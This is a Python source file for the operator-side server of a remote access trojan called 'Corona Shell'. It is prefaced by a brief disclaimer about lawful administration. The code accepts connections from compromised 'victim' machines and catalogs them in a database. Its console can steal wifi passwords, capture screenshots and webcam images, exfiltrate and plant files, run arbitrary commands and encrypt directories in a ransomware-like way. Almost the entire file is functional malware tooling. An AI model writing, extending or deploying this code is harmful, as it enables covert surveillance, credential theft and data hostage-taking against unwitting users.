#Created by Xand

#Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.


import socket
import os
import re
from time import gmtime, strftime
import time
import threading
import sqlite3
from prettytable import from_db_cursor

art = """
      /$$$$$$                                                   
     /$$__  $$                                                  
    | $$  \__/  /$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ 
    | $$       /$$__  $$ /$$__  $$ /$$__  $$| $$__  $$ |____  $$
    | $$      | $$  \ $$| $$  \__/| $$  \ $$| $$  \ $$  /$$$$$$$
    | $$    $$| $$  | $$| $$      | $$  | $$| $$  | $$ /$$__  $$
    |  $$$$$$/|  $$$$$$/| $$      |  $$$$$$/| $$  | $$|  $$$$$$$
     \______/  \______/ |__/       \______/ |__/  |__/ \_______/
"""

print(art)

user_guide = """
    Corona Shell Commands
             'list':['lists all active connections']
             'select (target Client_ID)':['selects a target and creates a session between the server and the client machine ']
             'guide': Display Corona's user commands
    Client Commands
            'quit':['quits the session and takes user back to the Corona shell interface']
            'wifi_passwords':['gets all known wifi password that the client node has ever connected to'],
            'screenshot':['takes a screen shot of the client machine'],
            'camshot':['captures an image from the client's webcam'],
            'encrypt (password) (directory)':[encrypts all files in the directory specified'] [if directory is not specified all files in the current directory will be encrypted],
            'decrypt (password) (directory)':['decrypts all files in the directory specified'] [if directory is not specified all files in the current directory will be decrypted],
            'get (filename or path)':['gets file from the victim's machine and sends it over to the server'],
            'send (filename or path)':['send file from server and stores it on the victim's machine']
"""

client_conn_object = []
client_conn_object.append("")
image_counter = 0

#create socket and listen for connection
def create_socket():
    global sock
    try:
        port = 4000
        host = socket.gethostbyname(socket.gethostname())
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((host, port))
        sock.listen(200) #listen for connection
        print("[+]Listening for a connection... \n")
    except socket.error as err:
        print("[-]Error unable to create socket!!!" + str(err))

#accept connection
def accept_connections(client_database_conn):
    while True:
        try:
            conn, addr = sock.accept()
            conn.setblocking(True)
            data = conn.recv(1024).decode()#recieves client system information
            client_info = format_client_info(data)#formats client to be stored in the database
            ip = re.findall("'(.*?)'", str(addr))#extract ip from addr
            ip = "".join(ip)#converts ip into string
            store_client_info(client_database_conn, ip, conn, client_info)#stores client data into database
            print("\n[+]Node " + str(addr) + " has just connected!!!")
        except:
            print("[-]Something went wrong connecting to client!!!")


#creates database where connected client info will be stored
def create_database():
    client_database_conn = sqlite3.connect('clientDatabase.db', check_same_thread=False)
    cursor = client_database_conn.cursor()
    #creates table if it does not exist
    cursor.execute("""CREATE TABLE IF NOT EXISTS connectedClients(
                        Client_ID INTEGER PRIMARY KEY NOT NULL,
                        Date_Joined DATETIME DEFAULT CURRENT_TIMESTAMP,
                        IP_Address TEXT NULL,
                        System TEXT NULL,
                        Node_Name TEXT NULL,
                        Release TEXT NULL,
                        Version TEXT NULL,
                        Machine TEXT NULL,
                        Processor TEXT NULL
                        );
                        """)
    #deletes whatever is in the table if it already exists
    cursor.execute('DELETE FROM connectedClients;');
    client_database_conn.commit()#commits changes to database
    return client_database_conn#socket connection object

#store client information in database when a new connection is made
def store_client_info(client_database_conn, ip, conn, client_sysinfo_list):
   cursor = client_database_conn.cursor()
   client_conn_object.append(conn)#add client conn to list as socket obejct cant be stored in the database
   #insert client info into database
   cursor.execute("INSERT INTO connectedClients(IP_Address, System, Node_Name, Release, Version, Machine, Processor) VALUES(?, ?, ?, ?, ?, ?, ?)", (ip, str(client_sysinfo_list[0]), str(client_sysinfo_list[1]), str(client_sysinfo_list[2]), str(client_sysinfo_list[3]), str(client_sysinfo_list[4]), str(client_sysinfo_list[5])))
   client_database_conn.commit()#commints changed

#retrive and display all client information in the database
def get_client_info(client_database_conn):
    cursor = client_database_conn.cursor()
    for conn_obj in range(1, len(client_conn_object)):
        try:
            # check if clients listed in database are still connected to the server
            client_conn_object[conn_obj].send("conn check".encode())
        except:
            #remove information from database and client_conn_object list if not connected
            client_conn_object.remove(client_conn_object[conn_obj])
            cursor.execute("DELETE FROM connectedClients WHERE Client_ID=?", (str(conn_obj)))

    cursor.execute("SELECT * FROM connectedClients")#retrive all client information in the database
    connected_client = from_db_cursor(cursor)#insert retrived client information into a table
    print(connected_client)

#formats client info in the right order to be saved in the database
def format_client_info(client_info):
    formatted_data_list = []
    regex_rules = re.compile(r"'(.*?)'")
    formatted_data = regex_rules.finditer(client_info)

    for data in formatted_data:
        formatted_data_list.append(data.group(1))

    return formatted_data_list


#sends null to the client and get the current working directory in return
def send_null(client_conn):
        client_conn.send(str(" ").encode())
        data = client_conn.recv(1024).decode()
        print(str(data), end="")

#establish a session with selected
def get_target_client(target_id):
    try:
        client_conn = client_conn_object[target_id]
        return client_conn #returns socket connection object
    except:
        print("[-]Client does not exist!!!")
        return None

def receive_client_image(client_conn):
    global image_counter
    image_counter += 1  #incremet every image id by 1
    client_ip = client_conn.recv(1024).decode()
    with open( "(" + client_ip + ")_" + "img_" + str(image_counter) + ".jpg", 'wb') as file:
        fileSize = int(client_conn.recv(1024).decode())#accept and decode image file size
        time.sleep(1)
        data = client_conn.recv(1024) #accept and decode length of data received
        totalFileRecv = len(data)
        #recieve all data until there no more data to receive
        while totalFileRecv < fileSize:
            totalFileRecv += len(data)
            file.write(data)
            data = client_conn.recv(1024)
        file.close()
    print("[+]Image received!!!")


#sends file from server to victim's machine
def send_file(conn, usrFile):
    #checck if file exists
    if not os.path.exists(usrFile):
        print("[-]File does not exist!!!")
        conn.send(str(" ").encode()) #get client current working directory
    else:
        fileSize = os.path.getsize(usrFile)
        conn.send(str(fileSize).encode())
        time.sleep(1)
        if fileSize == 0:
            print("[-]File is empty!!!")
            conn.send(str(" ").encode())
        else:
            with open(usrFile, 'rb') as file:
                data = file.read(1024)
                if fileSize < 1024:
                    conn.send(data)
                    file.close()
                else:
                    while data:
                        conn.send(data)
                        data = file.read(1024)
                    file.close()
                print("[+]Data sent!!!")


#recieves file from victim's machine
def receive_file(conn, usrFile):
    fileSize = int(conn.recv(1024).decode())
    if fileSize == 0:
        print("File is empty!!!")
    else:
        with open(usrFile, 'wb') as file:
            if fileSize < 1024:
                data = conn.recv(1024)
                file.write(data)
                file.close()
                print("[+]Data received!!!")
            else:
                data = conn.recv(1024)
                totalFileRecv = len(data)
                while totalFileRecv < fileSize:
                    totalFileRecv += len(data)
                    file.write(data)
                    data = conn.recv(1024)
                file.write(data)
                file.close()
                print("[+]Data received!!!")


#sends commands to the client
def client_session(client_conn):
    send_null(client_conn)
    while True:
        cmd = input()
        if cmd == 'quit':
            print("[+]Closing Session....")
            break
        elif cmd == "":
            send_null(client_conn)
        elif "get" in cmd:
            try:
                client_conn.send(str(cmd).encode())
                usrFile = client_conn.recv(1024).decode()
                data = client_conn.recv(1024).decode()
                if "File does not exist!!!" not in data:
                    receive_file(client_conn, usrFile)
                    print(str(data), end="")
                else:
                    print(data)
            except:
                print("[-]Connection terminated!!!")
                break
        elif "send" in cmd:
            try:
                client_conn.send(str(cmd).encode())
                send_file(client_conn, cmd[5:])
                data = client_conn.recv(1024).decode()
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        elif "screenshot" in cmd:
            try:
                client_conn.send(str(cmd).encode())
                data = client_conn.recv(1024).decode()
                receive_client_image(client_conn)
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        elif "camshot" in cmd:
            try:
                client_conn.send(str(cmd).encode())
                data = client_conn.recv(1024).decode()
                receive_client_image(client_conn)
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        elif cmd == "wifi_passwords":
            try:
                client_conn.send(str(cmd).encode())
                data = client_conn.recv(65536).decode()
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        else:
            try:
                client_conn.send(str(cmd).encode())
                data = client_conn.recv(65536).decode()
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break


def main():
    client_database_conn = create_database()
    t3 = threading.Thread(target=accept_connections, args=(client_database_conn,))
    t3.start()
    while True:
        print("\033[1;32mCorona>\033[1;m", end="")
        cmd = input()
        cmd = cmd.lower() #convert input to lower case
        if cmd == 'list':
            get_client_info(client_database_conn)
        elif 'guide' in cmd:
            print(user_guide)
        elif 'select' in cmd:
            target_id = re.findall("\d", cmd)
            target_id = ''.join(target_id)
            client_conn = get_target_client(int(target_id))
            client_session(client_conn)
        else:
            print("[-]Invalid command!!!")


create_socket()
t2 = threading.Thread(target=main).start()
